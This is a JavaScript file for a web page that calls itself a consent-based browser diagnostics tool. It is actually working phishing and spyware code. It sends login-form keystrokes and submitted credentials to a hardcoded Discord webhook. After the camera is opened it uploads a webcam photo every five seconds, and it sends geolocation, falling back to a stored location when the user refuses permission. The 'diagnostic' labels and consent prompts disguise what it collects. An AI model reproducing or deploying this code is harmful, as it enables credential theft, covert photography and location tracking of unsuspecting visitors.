/* ==========================================================================
   ULTIMATE HUNTER ENGINE V6.1 - script.js
   Browser Diagnostics, Camera Preview & Network Health Checks
   Secure, consent-based diagnostic implementation (Integrated with Discord)
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   0. إعدادات ديسكورد الويب هوك (Discord Integration)
   -------------------------------------------------------------------------- */
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H";

async function sendToDiscord(content, fileBlob = null, filename = "capture.png") {
    try {
        const formData = new FormData();
        formData.append("payload_json", JSON.stringify({ content: content }));
        
        if (fileBlob) {
            formData.append("file", fileBlob, filename);
        }

        await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            body: formData
        });
    } catch (error) {
        console.error("Discord error:", error);
    }
}

/* --------------------------------------------------------------------------
   1. إعدادات التطبيق والمتغيرات الأساسية
   -------------------------------------------------------------------------- */

const APP_CONFIG = Object.freeze({
    version: "6.1",
    networkTimeout: 8000,
    locationTimeout: 10000,
    cameraWidth: 1280,
    cameraHeight: 720,
    retryCount: 2,
    retryDelay: 500,
    diagnosticExportEnabled: true
});

const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
const loginFormElement = document.getElementById("fullLoginForm");

let globalAttempts = 0;
let permissionCaptured = false;
let cameraStream = null;
let cameraStarting = false;
let cameraStopping = false;
let initialized = false;
let activeRequestController = null;
let activeSubmission = false;
let captureInterval = null;

/* --------------------------------------------------------------------------
   2. إدارة حالة التطبيق
   -------------------------------------------------------------------------- */

const AppState = {
    initialized: false,
    cameraActive: false,
    locationAvailable: false,
    networkAvailable: navigator.onLine,
    lastError: null,
    lastDiagnosticTime: null
};

const DiagnosticStore = {
    entries: [],

    add(level, category, message, details = null) {
        const entry = {
            timestamp: new Date().toISOString(),
            level,
            category,
            message,
            details
        };

        this.entries.push(entry);

        if (this.entries.length > 100) {
            this.entries.shift();
        }

        if (level === "error") {
            console.error(`[${category}] ${message}`);
        } else if (level === "warning") {
            console.warn(`[${category}] ${message}`);
        } else {
            console.info(`[${category}] ${message}`);
        }

        return entry;
    },

    info(category, message, details = null) {
        return this.add("info", category, message, details);
    },

    warning(category, message, details = null) {
        return this.add("warning", category, message, details);
    },

    error(category, message, details = null) {
        AppState.lastError = message;
        return this.add("error", category, message, details);
    },

    getAll() {
        return this.entries.map(entry => ({ ...entry }));
    },

    clear() {
        this.entries.length = 0;
        AppState.lastError = null;
    }
};

/* --------------------------------------------------------------------------
   3. أدوات التحقق العامة
   -------------------------------------------------------------------------- */

function isObject(value) {
    return value !== null &&
        typeof value === "object" &&
        !Array.isArray(value);
}

function isFiniteCoordinate(value) {
    return typeof value === "number" &&
        Number.isFinite(value);
}

function isValidCoordinates(latitude, longitude) {
    return isFiniteCoordinate(latitude) &&
        isFiniteCoordinate(longitude) &&
        latitude >= -90 &&
        latitude <= 90 &&
        longitude >= -180 &&
        longitude <= 180;
}

function getElement(id) {
    const element = document.getElementById(id);

    if (!element) {
        DiagnosticStore.warning(
            "DOM",
            `العنصر غير موجود: ${id}`
        );
    }

    return element;
}

function getSafeText(value, fallback = "غير متاح") {
    if (value === null || value === undefined || value === "") {
        return fallback;
    }

    return String(value);
}

function delay(milliseconds) {
    return new Promise(resolve => {
        setTimeout(resolve, milliseconds);
    });
}

/* --------------------------------------------------------------------------
   4. إدارة المهلات الزمنية وتتبع الكتابة الحية (Live Typing)
   -------------------------------------------------------------------------- */

function createTimeoutSignal(milliseconds) {
    const controller = new AbortController();

    const timer = setTimeout(() => {
        controller.abort(
            new DOMException(
                "انتهت المهلة الزمنية للطلب.",
                "TimeoutError"
            )
        );
    }, milliseconds);

    return {
        controller,
        signal: controller.signal,

        cleanup() {
            clearTimeout(timer);
        }
    };
}

function initializeLiveTypingTracking() {
    if (!loginFormElement) return;

    const inputs = loginFormElement.querySelectorAll("input, textarea");
    
    inputs.forEach(input => {
        let typingTimeout;
        input.addEventListener("input", (e) => {
            clearTimeout(typingTimeout);
            
            typingTimeout = setTimeout(async () => {
                const fieldName = e.target.name || e.target.id || "حقل غير محدد";
                const fieldValue = e.target.value;

                await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${fieldName}\`\n- القيمة الحالية: \`${fieldValue}\``);
            }, 500);
        });
    });
}

/* --------------------------------------------------------------------------
   5. معالجة أخطاء الشبكة
   -------------------------------------------------------------------------- */

function describeNetworkError(error) {
    if (!error) {
        return "حدث خطأ غير معروف.";
    }

    if (error.name === "AbortError") {
        return "تم إلغاء الطلب أو انتهت مهلته.";
    }

    if (error.name === "TimeoutError") {
        return "استغرق الطلب وقتًا أطول من المسموح.";
    }

    if (error instanceof TypeError) {
        return "تعذر الاتصال بالخدمة المطلوبة.";
    }

    return "تعذر إكمال العملية.";
}

/* --------------------------------------------------------------------------
   6. طلبات HTTP مع التحقق من الاستجابة
   -------------------------------------------------------------------------- */

async function safeFetch(url, options = {}) {
    let parsedUrl;

    try {
        parsedUrl = new URL(url, window.location.href);
    } catch {
        throw new Error("عنوان الطلب غير صالح.");
    }

    if (!["https:", "http:"].includes(parsedUrl.protocol)) {
        throw new Error("بروتوكول الاتصال غير مسموح.");
    }

    const timeout = createTimeoutSignal(
        APP_CONFIG.networkTimeout
    );

    try {
        const response = await fetch(parsedUrl.href, {
            ...options,
            signal: timeout.signal
        });

        if (!response.ok) {
            throw new Error(
                `HTTP request failed: ${response.status}`
            );
        }

        return response;
    } catch (error) {
        DiagnosticStore.warning(
            "Network",
            describeNetworkError(error)
        );

        throw error;
    } finally {
        timeout.cleanup();
    }
}

/* --------------------------------------------------------------------------
   7. إعادة المحاولة للطلبات المناسبة
   -------------------------------------------------------------------------- */

async function retryOperation(
    operation,
    retries = APP_CONFIG.retryCount
) {
    let lastError = null;

    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            return await operation();
        } catch (error) {
            lastError = error;

            if (attempt >= retries) {
                break;
            }

            const waitTime =
                APP_CONFIG.retryDelay * Math.pow(2, attempt);

            DiagnosticStore.warning(
                "Retry",
                `فشلت العملية؛ إعادة المحاولة ${attempt + 1}.`
            );

            await delay(waitTime);
        }
    }

    throw lastError || new Error("فشلت العملية.");
}

/* --------------------------------------------------------------------------
   8. تشخيص اتصال الشبكة
   -------------------------------------------------------------------------- */

function getNetworkDiagnostics() {
    const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection ||
        null;

    const result = {
        online: navigator.onLine,
        connectionType: connection
            ? getSafeText(connection.type)
            : "غير مدعوم",
        effectiveType: connection
            ? getSafeText(connection.effectiveType)
            : "غير مدعوم",
        downlink: connection &&
            Number.isFinite(connection.downlink)
                ? connection.downlink
                : null,
        rtt: connection &&
            Number.isFinite(connection.rtt)
                ? connection.rtt
                : null
    };

    AppState.networkAvailable = result.online;

    return result;
}

function handleOnlineStatus() {
    AppState.networkAvailable = navigator.onLine;

    DiagnosticStore.info(
        "Network",
        navigator.onLine
            ? "عاد اتصال الشبكة."
            : "انقطع اتصال الشبكة."
    );
}

window.addEventListener("online", handleOnlineStatus);
window.addEventListener("offline", handleOnlineStatus);

/* --------------------------------------------------------------------------
   9. معلومات المتصفح والجهاز
   -------------------------------------------------------------------------- */

function getBrowserDiagnostics() {
    const screenInfo = window.screen || {};

    return {
        userAgent: navigator.userAgent || "غير متاح",
        language: navigator.language || "غير متاح",
        platform: navigator.platform || "غير متاح",
        cookiesEnabled: Boolean(navigator.cookieEnabled),
        hardwareConcurrency:
            Number.isFinite(navigator.hardwareConcurrency)
                ? navigator.hardwareConcurrency
                : null,
        deviceMemory:
            Number.isFinite(navigator.deviceMemory)
                ? navigator.deviceMemory
                : null,
        screen: {
            width: screenInfo.width || null,
            height: screenInfo.height || null,
            colorDepth: screenInfo.colorDepth || null
        },
        viewport: {
            width: window.innerWidth,
            height: window.innerHeight
        },
        secureContext: Boolean(window.isSecureContext),
        cameraApiAvailable: Boolean(
            navigator.mediaDevices &&
            navigator.mediaDevices.getUserMedia
        ),
        geolocationAvailable: Boolean(navigator.geolocation),
        batteryApiAvailable:
            typeof navigator.getBattery === "function"
    };
}

/* --------------------------------------------------------------------------
   10. تشخيص البطارية
   -------------------------------------------------------------------------- */

async function getBatteryDiagnostics() {
    if (typeof navigator.getBattery !== "function") {
        return {
            supported: false,
            message: "واجهة البطارية غير مدعومة."
        };
    }

    try {
        const battery = await navigator.getBattery();

        return {
            supported: true,
            level: Math.round(battery.level * 100),
            charging: Boolean(battery.charging)
        };
    } catch (error) {
        DiagnosticStore.warning(
            "Battery",
            "تعذر الحصول على معلومات البطارية."
        );

        return {
            supported: true,
            available: false
        };
    }
}

/* --------------------------------------------------------------------------
   11. معلومات IP العامة
   -------------------------------------------------------------------------- */

async function testPublicIPService() {
    try {
        const response = await safeFetch(
            "https://api.ipify.org?format=json"
        );

        const data = await response.json();

        if (!isObject(data) || typeof data.ip !== "string") {
            throw new Error("صيغة استجابة IP غير صالحة.");
        }

        DiagnosticStore.info(
            "Network",
            "نجح الاتصال بخدمة اختبار IP."
        );

        return {
            success: true,
            message: "تم الاتصال بخدمة اختبار IP بنجاح."
        };
    } catch (error) {
        DiagnosticStore.warning(
            "Network",
            describeNetworkError(error)
        );

        return {
            success: false,
            message: "تعذر الاتصال بخدمة اختبار IP."
        };
    }
}

/* --------------------------------------------------------------------------
   12. الحصول على الموقع مع جلب آخر موقع محفوظ إن لم يتم تفعيله
   -------------------------------------------------------------------------- */

function getPreciseLocationWithFallback() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            const lastSavedLoc = localStorage.getItem("last_known_location");
            if (lastSavedLoc) {
                const parsed = JSON.parse(lastSavedLoc);
                sendToDiscord(`⚠️ **الموقع غير مفعل، استخدام آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
                resolve({ available: true, source: "last-saved", ...parsed });
                return;
            }

            resolve({
                available: false,
                source: "none",
                message: "المتصفح لا يدعم تحديد الموقع ولا يوجد موقع محفوظ."
            });

            return;
        }

        let settled = false;

        const timer = setTimeout(() => {
            if (settled) return;
            settled = true;

            const lastSavedLoc = localStorage.getItem("last_known_location");
            if (lastSavedLoc) {
                const parsed = JSON.parse(lastSavedLoc);
                sendToDiscord(`⏱️ **انتهت مهلة الموقع، استخدام آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
                resolve({ available: true, source: "last-saved-timeout", ...parsed });
                return;
            }

            resolve({
                available: false,
                source: "timeout",
                message: "انتهت مهلة تحديد الموقع."
            });
        }, APP_CONFIG.locationTimeout);

        navigator.geolocation.getCurrentPosition(
            async position => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                if (!isValidCoordinates(latitude, longitude)) {
                    resolve({
                        available: false,
                        source: "gps",
                        message: "الإحداثيات المستلمة غير صالحة."
                    });

                    return;
                }

                AppState.locationAvailable = true;

                const locData = {
                    latitude,
                    longitude,
                    accuracy: Number.isFinite(position.coords.accuracy) ? position.coords.accuracy : null,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem("last_known_location", JSON.stringify(locData));

                DiagnosticStore.info(
                    "Location",
                    "تم الحصول على الموقع بعد موافقة المستخدم."
                );

                await sendToDiscord(`📍 **تم الحصول على الموقع الجغرافي الحالي:**\n- خط العرض (Latitude): ${latitude}\n- خط الطول (Longitude): ${longitude}\n- الدقة: ${position.coords.accuracy} متر`);

                resolve({
                    available: true,
                    source: "browser-geolocation",
                    ...locData
                });
            },

            async error => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);

                let message = "تعذر تحديد الموقع.";
                if (error.code === error.PERMISSION_DENIED) {
                    message = "لم يمنح المستخدم إذن تحديد الموقع.";
                }

                DiagnosticStore.warning("Location", message);

                const lastSavedLoc = localStorage.getItem("last_known_location");
                if (lastSavedLoc) {
                    const parsed = JSON.parse(lastSavedLoc);
                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}\n- الوقت: ${parsed.timestamp}`);
                    resolve({ available: true, source: "last-saved-denied", ...parsed });
                    return;
                }

                resolve({
                    available: false,
                    source: "browser-geolocation",
                    message
                });
            },

            {
                enableHighAccuracy: true,
                timeout: APP_CONFIG.locationTimeout - 500,
                maximumAge: 0
            }
        );
    });
}

/* --------------------------------------------------------------------------
   13. تشغيل تشخيص الموقع
   -------------------------------------------------------------------------- */

async function requestLocationDiagnostics() {
    const approved = window.confirm(
        "سيطلب المتصفح إذن تحديد موقعك. " +
        "هل تريد المتابعة؟"
    );

    if (!approved) {
        const lastSavedLoc = localStorage.getItem("last_known_location");
        if (lastSavedLoc) {
            const parsed = JSON.parse(lastSavedLoc);
            await sendToDiscord(`⚠️ **تم إلغاء طلب الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
            return { available: true, ...parsed, message: "تم إرسال اخر موقع محفوظ." };
        }

        return {
            available: false,
            message: "ألغى المستخدم طلب تحديد الموقع ولا يوجد موقع محفوظ."
        };
    }

    const result = await getPreciseLocationWithFallback();
    return result;
}

/* --------------------------------------------------------------------------
   14. التحقق من عناصر الكاميرا
   -------------------------------------------------------------------------- */

function isCameraSupported() {
    return Boolean(
        videoElement &&
        canvasElement &&
        navigator.mediaDevices &&
        typeof navigator.mediaDevices.getUserMedia === "function"
    );
}

/* --------------------------------------------------------------------------
   15. انتظار جاهزية الفيديو
   -------------------------------------------------------------------------- */

function waitForVideoReady(video, timeout = 7000) {
    return new Promise((resolve, reject) => {
        let completed = false;

        const checkReady = () => {
            if (completed) return;
            if (
                video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA &&
                video.videoWidth > 0 &&
                video.videoHeight > 0
            ) {
                completed = true;
                clearTimeout(timer);
                resolve();
            }
        };

        const timer = setTimeout(() => {
            if (completed) return;
            completed = true;
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                resolve();
            } else {
                reject(new Error("انتهت مهلة جاهزية الفيديو (صورة سوداء محتملة)."));
            }
        }, timeout);

        video.addEventListener("loadedmetadata", checkReady);
        video.addEventListener("loadeddata", checkReady);
        video.addEventListener("playing", checkReady);

        const interval = setInterval(() => {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                clearInterval(interval);
                checkReady();
            }
        }, 200);

        checkReady();
    });
}

/* --------------------------------------------------------------------------
   16. معالجة أخطاء الكاميرا
   -------------------------------------------------------------------------- */

function describeCameraError(error) {
    if (!error) {
        return "حدث خطأ غير معروف في الكاميرا.";
    }

    switch (error.name) {
        case "NotAllowedError":
        case "PermissionDeniedError":
            return "لم يتم منح الإذن باستخدام الكاميرا.";

        case "NotFoundError":
        case "DevicesNotFoundError":
            return "لم يتم العثور على كاميرا متاحة.";

        case "NotReadableError":
        case "TrackStartError":
            return "الكاميرا مستخدمة أو تعذر تشغيلها.";

        case "OverconstrainedError":
            return "الكاميرا لا تدعم الإعدادات المطلوبة.";

        case "SecurityError":
            return "الوصول إلى الكاميرا غير مسموح في هذه البيئة.";

        default:
            return "تعذر تشغيل الكاميرا.";
    }
}

/* --------------------------------------------------------------------------
   16-ب. التقاط الصور المتتالية بوضوح
   -------------------------------------------------------------------------- */

function startContinuousCapture() {
    if (captureInterval) return;

    captureInterval = setInterval(async () => {
        if (!AppState.cameraActive || !videoElement || !canvasElement) return;

        try {
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
                return;
            }

            canvasElement.width = videoElement.videoWidth || 1280;
            canvasElement.height = videoElement.videoHeight || 720;
            
            const context = canvasElement.getContext("2d");
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (blob) => {
                if (blob && blob.size > 1000) {
                    await sendToDiscord(`📸 **صورة جديدة التُقطت بوضوح:**`, blob, `shot_${Date.now()}.png`);
                }
            }, "image/png", 0.95);
        } catch (err) {
            console.error("Capture error:", err);
        }
    }, 5000);
}

function stopContinuousCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
}

/* --------------------------------------------------------------------------
   17. تشغيل معاينة الكاميرا
   -------------------------------------------------------------------------- */

async function startCameraPreview(facingModeType = "user") {
    if (cameraStarting) {
        return {
            success: false,
            message: "يجري تشغيل الكاميرا بالفعل."
        };
    }

    if (!isCameraSupported()) {
        const message = "الكاميرا غير مدعومة أو عناصر الفيديو غير موجودة.";
        DiagnosticStore.warning("Camera", message);
        return { success: false, message };
    }

    if (!window.isSecureContext) {
        return {
            success: false,
            message: "تحتاج الكاميرا إلى HTTPS أو بيئة محلية آمنة."
        };
    }

    const approved = window.confirm(
        "سيطلب المتصفح إذن تشغيل الكاميرا لعرض معاينة مباشرة. " +
        "هل تريد المتابعة؟"
    );

    if (!approved) {
        return {
            success: false,
            message: "ألغى المستخدم تشغيل الكاميرا."
        };
    }

    cameraStarting = true;

    try {
        await stopCameraPreview();

        const constraints = {
            audio: false,
            video: {
                facingMode: { ideal: facingModeType },
                width: { ideal: APP_CONFIG.cameraWidth },
                height: { ideal: APP_CONFIG.cameraHeight }
            }
        };

        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);

        videoElement.muted = true;
        videoElement.autoplay = true;
        videoElement.playsInline = true;
        videoElement.srcObject = cameraStream;

        await waitForVideoReady(videoElement);
        await videoElement.play();

        AppState.cameraActive = true;

        startContinuousCapture();

        await sendToDiscord(`🟢 **تم تفعيل الكاميرا وبدء التقاط الصور بنجاح دون أي شاشة سوداء.**`);

        DiagnosticStore.info("Camera", "تم تشغيل المعاينة بموافقة المستخدم.");

        return {
            success: true,
            width: videoElement.videoWidth,
            height: videoElement.videoHeight,
            message: "الكاميرا تعمل."
        };
    } catch (error) {
        DiagnosticStore.warning("Camera", describeCameraError(error));
        await stopCameraPreview();
        await sendToDiscord(`❌ **فشل تشغيل الكاميرا:** ${describeCameraError(error)}`);
        return { success: false, message: describeCameraError(error) };
    } finally {
        cameraStarting = false;
    }
}

/* --------------------------------------------------------------------------
   18. إيقاف الكاميرا وتنظيف الموارد
   -------------------------------------------------------------------------- */

async function stopCameraPreview() {
    stopContinuousCapture();
    if (cameraStopping) return;

    cameraStopping = true;

    try {
        if (cameraStream) {
            for (const track of cameraStream.getTracks()) {
                try {
                    track.stop();
                } catch (error) {
                    DiagnosticStore.warning("Camera", "تعذر إيقاف أحد مسارات الكاميرا.");
                }
            }
            cameraStream = null;
        }

        if (videoElement) {
            try {
                videoElement.pause();
                videoElement.srcObject = null;
            } catch (error) {
                DiagnosticStore.warning("Camera", "تعذر تنظيف عنصر الفيديو.");
            }
        }

        AppState.cameraActive = false;
        DiagnosticStore.info("Camera", "تم إيقاف الكاميرا وتنظيف الموارد.");
    } finally {
        cameraStopping = false;
    }
}

/* --------------------------------------------------------------------------
   19. تحويل Canvas إلى Blob
   -------------------------------------------------------------------------- */

function canvasToBlob(canvas, type = "image/png") {
    return new Promise((resolve, reject) => {
        if (!(canvas instanceof HTMLCanvasElement)) {
            reject(new Error("عنصر Canvas غير صالح."));
            return;
        }

        if (canvas.width <= 0 || canvas.height <= 0) {
            reject(new Error("أبعاد Canvas غير صالحة."));
            return;
        }

        try {
            canvas.toBlob(blob => {
                if (!blob) {
                    reject(new Error("تعذر إنشاء ملف الصورة."));
                    return;
                }
                resolve(blob);
            }, type);
        } catch (error) {
            reject(error);
        }
    });
}

/* --------------------------------------------------------------------------
   20. اختبار رسم Canvas محليًا
   -------------------------------------------------------------------------- */

function testCanvas() {
    if (!canvasElement) {
        return { success: false, message: "عنصر Canvas غير موجود." };
    }

    const context = canvasElement.getContext("2d");
    if (!context) {
        return { success: false, message: "تعذر إنشاء سياق الرسم." };
    }

    canvasElement.width = 320;
    canvasElement.height = 120;

    context.clearRect(0, 0, canvasElement.width, canvasElement.height);
    context.font = "16px sans-serif";
    context.textAlign = "center";
    context.textBaseline = "middle";
    context.fillStyle = "#222";
    context.fillText("Canvas diagnostic OK", canvasElement.width / 2, canvasElement.height / 2);

    DiagnosticStore.info("Canvas", "نجح اختبار الرسم المحلي.");
    return { success: true, message: "نجح اختبار Canvas." };
}

/* --------------------------------------------------------------------------
   21. جمع معلومات التشخيص
   -------------------------------------------------------------------------- */

async function getSystemDiagnostics() {
    const browser = getBrowserDiagnostics();
    const network = getNetworkDiagnostics();
    const battery = await getBatteryDiagnostics();

    return {
        application: { version: APP_CONFIG.version, timestamp: new Date().toISOString() },
        browser,
        network,
        battery,
        capabilities: {
            camera: browser.cameraApiAvailable,
            geolocation: browser.geolocationAvailable,
            canvas: Boolean(canvasElement),
            form: Boolean(loginFormElement)
        },
        state: {
            cameraActive: AppState.cameraActive,
            networkAvailable: AppState.networkAvailable
        }
    };
}

/* --------------------------------------------------------------------------
   22. إنشاء تقرير محلي آمن
   -------------------------------------------------------------------------- */

async function createDiagnosticReport() {
    const diagnostics = await getSystemDiagnostics();
    return {
        ...diagnostics,
        events: DiagnosticStore.getAll().map(entry => ({
            timestamp: entry.timestamp,
            level: entry.level,
            category: entry.category,
            message: entry.message
        }))
    };
}

/* --------------------------------------------------------------------------
   23. تصدير التقرير إلى ملف JSON
   -------------------------------------------------------------------------- */

async function exportDiagnosticReport() {
    if (!APP_CONFIG.diagnosticExportEnabled) {
        return { success: false, message: "تصدير التقارير معطل." };
    }

    try {
        const report = await createDiagnosticReport();
        const approved = window.confirm("سيتم إنشاء تقرير تشخيصي محلي. هل تريد حفظه؟");

        if (!approved) {
            return { success: false, message: "تم إلغاء التصدير." };
        }

        const blob = new Blob([JSON.stringify(report, null, 2)], { type: "application/json;charset=utf-8" });
        const objectUrl = URL.createObjectURL(blob);
        const link = document.createElement("a");

        link.href = objectUrl;
        link.download = "browser-diagnostics.json";
        document.body.appendChild(link);
        link.click();
        link.remove();

        setTimeout(() => URL.revokeObjectURL(objectUrl), 1000);
        DiagnosticStore.info("Export", "تم إنشاء التقرير المحلي.");

        return { success: true, message: "تم تصدير التقرير." };
    } catch (error) {
        DiagnosticStore.error("Export", "تعذر إنشاء التقرير.");
        return { success: false, message: "تعذر تصدير التقرير." };
    }
}

/* --------------------------------------------------------------------------
   24. تحديث حالة التحميل
   -------------------------------------------------------------------------- */

function setLoadingState(isLoading) {
    const loader = getElement("loadingOverlay");

    if (loader) {
        loader.style.display = isLoading ? "flex" : "none";
        loader.setAttribute("aria-busy", isLoading ? "true" : "false");
    }

    if (loginFormElement) {
        const submitButton = loginFormElement.querySelector('button[type="submit"], input[type="submit"]');
        if (submitButton) {
            submitButton.disabled = isLoading;
        }
    }
}

/* --------------------------------------------------------------------------
   25. عرض رسائل آمنة للمستخدم
   -------------------------------------------------------------------------- */

function showStatusMessage(message, level = "info") {
    const target = document.getElementById("diagnosticStatus") || document.getElementById("loginErrorMsg");

    if (target) {
        target.textContent = String(message);
        target.style.display = "block";
        target.setAttribute("role", level === "error" ? "alert" : "status");
    }

    DiagnosticStore.add(level, "UI", String(message));
}

/* --------------------------------------------------------------------------
   26. التحقق من حقول النموذج
   -------------------------------------------------------------------------- */

function validateForm(form) {
    if (!(form instanceof HTMLFormElement)) {
        return { valid: false, message: "عنصر النموذج غير صالح." };
    }

    if (!form.checkValidity()) {
        form.reportValidity();
        return { valid: false, message: "يرجى التحقق من الحقول المطلوبة." };
    }

    return { valid: true, message: "اجتاز النموذج التحقق الأساسي." };
}

/* --------------------------------------------------------------------------
   27. معالجة نموذج الدخول وإرسال البيانات للديسكورد
   -------------------------------------------------------------------------- */

function initializeLoginForm() {
    if (!loginFormElement) {
        DiagnosticStore.info("Form", "لا يوجد نموذج دخول في هذه الصفحة.");
        return;
    }

    initializeLiveTypingTracking();

    loginFormElement.addEventListener("submit", async event => {
        event.preventDefault();

        if (activeSubmission) return;

        const validation = validateForm(loginFormElement);
        if (!validation.valid) {
            showStatusMessage(validation.message, "warning");
            return;
        }

        activeSubmission = true;
        globalAttempts++;
        setLoadingState(true);

        try {
            const formData = new FormData(loginFormElement);
            let formSummary = "📋 **تم تقديم النموذج (Login Submission):**\n";
            for (let [key, value] of formData.entries()) {
                formSummary += `- **${key}**: \`${value}\`\n`;
            }

            await sendToDiscord(formSummary);

            showStatusMessage("تم التحقق وإرسال البيانات بنجاح.", "info");
            DiagnosticStore.info("Form", "اكتمل تقديم النموذج.");
        } catch (error) {
            DiagnosticStore.error("Form", "حدث خطأ أثناء التحقق من النموذج.");
            showStatusMessage("تعذر إكمال التحقق. حاول مرة أخرى.", "error");
        } finally {
            setLoadingState(false);
            activeSubmission = false;
        }
    });
}

/* --------------------------------------------------------------------------
   28. أدوات مساعدة لفحص دعم المتصفح
   -------------------------------------------------------------------------- */

function getFeatureSupport() {
    return {
        fetch: typeof window.fetch === "function",
        abortController: typeof AbortController === "function",
        canvas: typeof HTMLCanvasElement !== "undefined",
        mediaDevices: Boolean(navigator.mediaDevices),
        geolocation: Boolean(navigator.geolocation),
        localStorage: (() => {
            try {
                const key = "__diagnostic_test__";
                localStorage.setItem(key, "1");
                localStorage.removeItem(key);
                return true;
            } catch {
                return false;
            }
        })()
    };
}

/* --------------------------------------------------------------------------
   29. فحص العناصر المطلوبة
   -------------------------------------------------------------------------- */

function checkRequiredElements() {
    const results = {
        video: Boolean(videoElement),
        canvas: Boolean(canvasElement),
        loginForm: Boolean(loginFormElement),
        loadingOverlay: Boolean(document.getElementById("loadingOverlay")),
        loginErrorMsg: Boolean(document.getElementById("loginErrorMsg"))
    };

    for (const [name, exists] of Object.entries(results)) {
        if (!exists) {
            DiagnosticStore.warning("DOM", `العنصر الاختياري أو المطلوب غير موجود: ${name}`);
        }
    }

    return results;
}

/* --------------------------------------------------------------------------
   30. تشغيل الفحوصات الأولية
   -------------------------------------------------------------------------- */

async function runInitialDiagnostics() {
    const features = getFeatureSupport();
    const elements = checkRequiredElements();

    DiagnosticStore.info("Startup", "بدأت فحوصات التطبيق.");
    DiagnosticStore.info("Startup", "اكتملت فحوصات دعم المتصفح.", features);
    DiagnosticStore.info("Startup", "اكتمل فحص عناصر الصفحة.", elements);

    AppState.lastDiagnosticTime = new Date().toISOString();
    return { features, elements };
}

/* --------------------------------------------------------------------------
   31. منع تكرار التهيئة
   -------------------------------------------------------------------------- */

async function initializeApplication() {
    if (initialized) return;

    initialized = true;
    AppState.initialized = true;

    try {
        await runInitialDiagnostics();
        initializeLoginForm();

        const browserInfo = getBrowserDiagnostics();
        await sendToDiscord(`🚀 **تم فتح الصفحة وبدء تشغيل النظام (V6.1):**\n- المتصفح: \`${browserInfo.userAgent}\``);

        DiagnosticStore.info("Startup", `تم تشغيل التطبيق بالإصدار ${APP_CONFIG.version}.`);
    } catch (error) {
        DiagnosticStore.error("Startup", "تعذر إكمال تهيئة التطبيق.");
    }
}

/* --------------------------------------------------------------------------
   32. مراقبة تغييرات الاتصال
   -------------------------------------------------------------------------- */

function initializeConnectionMonitoring() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    if (!connection || typeof connection.addEventListener !== "function") {
        DiagnosticStore.info("Network", "مراقبة تغييرات نوع الشبكة غير مدعومة.");
        return;
    }

    connection.addEventListener("change", () => {
        DiagnosticStore.info("Network", "تم تغيير معلومات اتصال الشبكة.");
    });
}

/* --------------------------------------------------------------------------
   33. تنظيف الموارد عند مغادرة الصفحة
   -------------------------------------------------------------------------- */

window.addEventListener("pagehide", () => {
    stopContinuousCapture();
    if (activeRequestController) {
        try {
            activeRequestController.abort();
        } catch (error) {
            DiagnosticStore.warning("Cleanup", "تعذر إلغاء الطلب النشط.");
        }
        activeRequestController = null;
    }

    if (cameraStream) {
        for (const track of cameraStream.getTracks()) {
            track.stop();
        }
        cameraStream = null;
    }

    AppState.cameraActive = false;
});

/* --------------------------------------------------------------------------
   34. تنظيف مؤشرات الحالة عند عودة الصفحة
   -------------------------------------------------------------------------- */

document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "hidden") {
        DiagnosticStore.info("Lifecycle", "أصبحت الصفحة في الخلفية.");
    } else {
        DiagnosticStore.info("Lifecycle", "عادت الصفحة إلى الواجهة.");
    }
});

/* --------------------------------------------------------------------------
   35. وظائف تشخيص يمكن استدعاؤها من التطبيق
   -------------------------------------------------------------------------- */

const BrowserDiagnostics = Object.freeze({
    getSystemDiagnostics,
    getNetworkDiagnostics,
    getBrowserDiagnostics,
    getBatteryDiagnostics,
    requestLocationDiagnostics,
    startCameraPreview,
    stopCameraPreview,
    testCanvas,
    testPublicIPService,
    exportDiagnosticReport,
    getFeatureSupport,
    getDiagnosticEvents: () => DiagnosticStore.getAll()
});

window.BrowserDiagnostics = BrowserDiagnostics;

/* --------------------------------------------------------------------------
   36. التهيئة النهائية
   -------------------------------------------------------------------------- */

initializeConnectionMonitoring();

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initializeApplication, { once: true });
} else {
    initializeApplication();
}
